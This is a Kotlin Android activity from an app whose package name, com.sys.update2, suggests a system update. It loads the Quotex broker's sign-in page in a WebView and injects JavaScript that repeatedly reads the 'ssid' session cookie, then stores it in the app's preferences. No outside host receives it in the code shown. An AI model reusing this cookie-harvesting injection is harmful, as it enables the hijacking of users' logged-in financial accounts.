package com.sys.update2

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class QuotexWebViewActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val TAG = "QuotexWebView"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this)
        setContentView(webView)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = false
            displayZoomControls = false
            userAgentString = "Mozilla/5.0 (Linux; Android 13) " +
                "AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/120.0.0.0 Mobile Safari/537.36"
        }

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(webView, true)

        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun onSSID(ssid: String) {
                Log.d(TAG, "SSID received: ${ssid.take(20)}...")
                runOnUiThread {
                    if (ssid.isNotBlank()) {
                        getSharedPreferences("qtx", MODE_PRIVATE)
                            .edit()
                            .putString("ssid", ssid)
                            .putLong("ssid_time", System.currentTimeMillis())
                            .apply()

                        Toast.makeText(
                            this@QuotexWebViewActivity,
                            "✅ تم استلام الجلسة",
                            Toast.LENGTH_SHORT
                        ).show()

                        startActivity(
                            Intent(this@QuotexWebViewActivity, PricesActivity::class.java)
                        )
                        finish()
                    }
                }
            }
        }, "AndroidBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "Page loaded: $url")
                if (url?.contains("qxbroker.com") == true) {
                    injectScript()
                }
            }
        }

        webView.loadUrl("https://qxbroker.com/ar/sign-in")
    }

    private fun injectScript() {
        val js = """
            (function() {
              if (window.__qtxHooked) return;
              window.__qtxHooked = true;
              function grab() {
                try {
                  var c = document.cookie || '';
                  var m = c.match(/(?:^|;\s*)ssid=([^;]+)/);
                  if (m && m[1]) {
                    window.AndroidBridge.onSSID(decodeURIComponent(m[1]));
                    return true;
                  }
                } catch (e) {}
                return false;
              }
              setInterval(grab, 800);
              document.addEventListener('submit', function() {
                setTimeout(grab, 400);
              }, true);
              document.addEventListener('click', function(e) {
                var t = e.target.closest('button, [type="submit"], [role="button"]');
                if (t) setTimeout(grab, 400);
              }, true);
              grab();
            })();
        """.trimIndent()

        webView.evaluateJavascript(js, null)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
